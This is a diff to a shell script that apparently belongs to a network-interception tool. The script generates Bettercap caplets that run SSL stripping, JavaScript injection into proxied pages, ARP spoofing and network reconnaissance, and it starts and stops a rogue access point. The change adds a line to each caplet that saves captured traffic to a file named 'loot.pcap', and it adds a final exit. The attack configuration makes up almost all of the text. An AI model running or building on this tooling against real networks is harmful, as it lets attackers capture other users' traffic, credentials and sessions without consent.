@@ -155,6 +155,7 @@ printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
 path=$(pwd)
 cat <<EOF > sniffconf.cap
 set net.sniff.local true
+set net.sniff.output loot.pcap
 set http.proxy.sslstrip true
 set http.proxy.injectjs ${path}/BetterSniff_injection.js
 http.proxy on
@@ -190,6 +191,7 @@ sleep 0.2
 printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
 cat <<EOF > sniffconf.cap
 set net.sniff.local true
+set net.sniff.output loot.pcap
 set http.proxy.sslstrip true
 set http.proxy.injectjs ${js_path}
 http.proxy on
@@ -221,6 +223,7 @@ sleep 0.2
 printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
 cat <<EOF > sniffconf.cap
 set net.sniff.local true
+set net.sniff.output loot.pcap
 set http.proxy.sslstrip true
 http.proxy on
 net.recon on
@@ -329,6 +332,7 @@ printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
 path=$(pwd)
 cat <<EOF > sniffconf.cap
 set net.sniff.local true
+set net.sniff.output loot.pcap
 set arp.spoof.fullduplex true
 set arp.spoof.internal true
 set http.proxy.sslstrip true
@@ -360,6 +364,7 @@ sleep 0.2
 printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
 cat <<EOF > sniffconf.cap
 set net.sniff.local true
+set net.sniff.output loot.pcap
 set arp.spoof.fullduplex true
 set arp.spoof.internal true
 set http.proxy.sslstrip true
@@ -385,6 +390,7 @@ sleep 0.2
 printf "\n\n${red}[*] ${lightred}Writing caplet for Bettercap..."
 cat <<EOF > sniffconf.cap
 set net.sniff.local true
+set net.sniff.output loot.pcap
 set arp.spoof.fullduplex true
 set arp.spoof.internal true
 set http.proxy.sslstrip true
@@ -413,3 +419,4 @@ rm BetterSniff_injection.js 2> /dev/null
 rm sniffconf.cap 2> /dev/null
 create_ap --stop ${interface} > /dev/null
 
+exit 0
